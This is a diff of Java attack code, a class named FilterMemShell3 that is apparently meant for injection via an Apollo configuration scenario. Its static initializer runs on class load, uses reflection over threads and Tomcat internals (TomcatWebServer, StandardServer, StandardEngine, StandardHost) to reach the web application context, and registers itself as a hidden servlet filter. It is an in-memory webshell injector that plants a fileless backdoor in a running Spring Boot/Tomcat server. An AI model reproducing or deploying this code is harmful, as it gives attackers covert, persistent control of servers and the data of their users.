@@ -1,36 +1,34 @@
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.ApplicationContextFacade;
-import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.Service;
+import org.apache.catalina.core.*;
+import org.apache.catalina.startup.Tomcat;
 import org.apache.tomcat.util.descriptor.web.FilterDef;
 import org.apache.tomcat.util.descriptor.web.FilterMap;
-import org.springframework.web.context.request.RequestContextHolder;
-import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.boot.web.embedded.tomcat.TomcatWebServer;
 
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import java.io.IOException;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.util.HashMap;
 
-public class FilterMemShell implements Filter {
-    private static FilterMemShell fms = new FilterMemShell();
+/**
+ * for apollo config scenario
+ */
+public class FilterMemShell3 implements Filter {
+    static {
+        new FilterMemShell3();
+    }
 
-    public FilterMemShell() {
+    public FilterMemShell3() {
         try {
-            ServletRequestAttributes attr = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
-            ServletContext servletContext = attr.getRequest().getServletContext();
-            ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletContext;
-            Field appCtxField = ApplicationContextFacade.class.getDeclaredField("context");
-            appCtxField.setAccessible(true);
-            ApplicationContext appCtx = (ApplicationContext) appCtxField.get(appCtxFacade);
-            Field stdCtxField = ApplicationContext.class.getDeclaredField("context");
-            stdCtxField.setAccessible(true);
-            StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);
+            StandardContext stdCtx = getContext();
 
             //1.添加filterDef
-            FilterMemShell filterMemShell = new FilterMemShell("abc");
+            FilterMemShell3 filterMemShell = new FilterMemShell3("abc");
             FilterDef filterDef = new FilterDef();
-            filterDef.setFilterClass("FilterMemShell");
+            filterDef.setFilterClass("FilterMemShell3");
             filterDef.setFilterName(filterMemShell.getClass().getName());
             filterDef.setFilter(filterMemShell);
             stdCtx.addFilterDef(filterDef);
@@ -63,7 +61,46 @@ public class FilterMemShell implements Filter {
         }
     }
 
-    public FilterMemShell(String anyStr) {
+    public FilterMemShell3(String anyStr) {
+    }
+
+    private StandardContext getContext() {
+        try {
+            Method m = Thread.class.getDeclaredMethod("getThreads");
+            m.setAccessible(true);
+            Thread[] ts = (Thread[]) m.invoke(null);
+
+            for (int i = 0; i < ts.length; i++) {
+                try {
+                    Field this$0 = ts[i].getClass().getDeclaredField("this$0");
+                    this$0.setAccessible(true);
+                    TomcatWebServer tws = (TomcatWebServer) this$0.get(ts[i]);
+                    Tomcat tomcat = tws.getTomcat();
+                    StandardServer server = (StandardServer) tomcat.getServer();
+                    Field services = server.getClass().getDeclaredField("services");
+                    services.setAccessible(true);
+                    Object o = services.get(server);
+                    Service[] sArr = (Service[]) o;
+                    StandardService ss = (StandardService) sArr[0];
+                    Field engine = ss.getClass().getDeclaredField("engine");
+                    engine.setAccessible(true);
+                    StandardEngine se = (StandardEngine) engine.get(ss);
+                    Field children = se.getClass().getSuperclass().getDeclaredField("children");
+                    children.setAccessible(true);
+                    HashMap o1 = (HashMap) children.get(se);
+                    StandardHost o2 = (StandardHost) o1.get("localhost");
+                    Field children1 = o2.getClass().getSuperclass().getDeclaredField("children");
+                    children1.setAccessible(true);
+                    HashMap o3 = (HashMap) children1.get(o2);
+                    StandardContext o4 = (StandardContext) o3.get("");
+                    return o4;
+                } catch (Exception ex) {
+                }
+            }
+        } catch (Exception e) {
+        }
+
+        return null;
     }
 
     @Override
